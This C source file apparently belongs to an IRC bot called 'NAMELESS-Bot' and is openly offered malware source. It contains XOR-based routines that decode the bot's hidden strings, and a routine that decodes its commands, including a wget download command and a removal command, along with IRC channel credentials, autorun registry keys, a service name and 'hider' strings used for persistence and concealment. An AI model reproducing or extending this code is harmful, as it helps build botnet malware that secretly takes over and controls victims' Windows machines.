/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include <stdio.h>
#include <string.h>
#include "global.h"
#include "strings_other.h"

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

/* FOR APIS */
char *DecodeApis(unsigned char *string)
{
    unsigned int i, j;

    for (i = 0; i < strlen(string); i++)
    {
        for (j = 0; j < strlen(api_pass); j++)
            string[i] ^= api_pass[j];

        string[i] = ~ string[i];
    }

    return string;
}

/* FOR CONFIG */
char *DecodeConfig(unsigned char *string)
{
    unsigned int i, j;

    for (i = 0; i < strlen(string); i++)
    {
        for (j = 0; j < strlen(config_pass); j++)
            string[i] ^= config_pass[j];

        string[i] = ~ string[i];
    }

    return string;
}

/* FOR OTHER STRINGS */
char *DecodeOthers(unsigned char *string)
{
    unsigned int i, j;

    for (i = 0; i < strlen(string); i++)
    {
        for (j = 0; j < strlen(other_pass); j++)
            string[i] ^= other_pass[j];

        string[i] = ~ string[i];
    }

    return string;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

/* not really encryption, but keeps "stupid" people from knowing your cmds */
char* Reverse_Str(char* str)
{
    char *temp, *ptr;
    int len, i;

    temp=str;
    for (len=0; *temp !='\0';temp++, len++);

    ptr=malloc(sizeof(char)*(len+1));

    for (i=len-1; i>=0; i--)
        ptr[len-i-1]=str[i];

    ptr[len]='\0';
    return ptr;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void decode_things(void)
{
    /* CMDS */
    DecodeOthers(cmd__RECONNECT);
    DecodeOthers(cmd__REMOVAL);
    DecodeOthers(cmd__JOIN);
    DecodeOthers(cmd__PART);
    DecodeOthers(cmd__WGET);

    /* IRC */
    DecodeOthers(my_nick);
    DecodeOthers(my_user);
    DecodeOthers(my_privmsg);
    DecodeOthers(my_notice);
    DecodeOthers(my_pass);
    DecodeOthers(my_join);
    DecodeOthers(my_part);
    DecodeOthers(my_quit);
    DecodeOthers(my_4_4_3);
    DecodeOthers(my_3_3_2);

    DecodeOthers(win_unk); //OS_UNKNOWN;
    DecodeOthers(win_2k); //OS_WIN2K
    DecodeOthers(win_2k3);
    DecodeOthers(win_2k8);
    DecodeOthers(win_xp);
    DecodeOthers(win_vista);
    DecodeOthers(win_7);

    /* Other Strings */
    DecodeOthers(my_userprofile);
    DecodeOthers(autorun);
    DecodeOthers(autorun2);
    DecodeOthers(regkey_location);
    DecodeOthers(servicedesc);
    DecodeOthers(useragent);
    DecodeOthers(str_reconnect);
    DecodeOthers(str_removing);

    /* For Hider */
    DecodeOthers(win_number);
    DecodeOthers(regedit);
    DecodeOthers(syslist32);
    DecodeOthers(t1m3r);

    /* CONFIG SHIT */
    DecodeConfig(chan);
    DecodeConfig(chanpass);
    DecodeConfig(authost);
    DecodeConfig(prefix);
    DecodeConfig(exename);
    DecodeConfig(regname);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
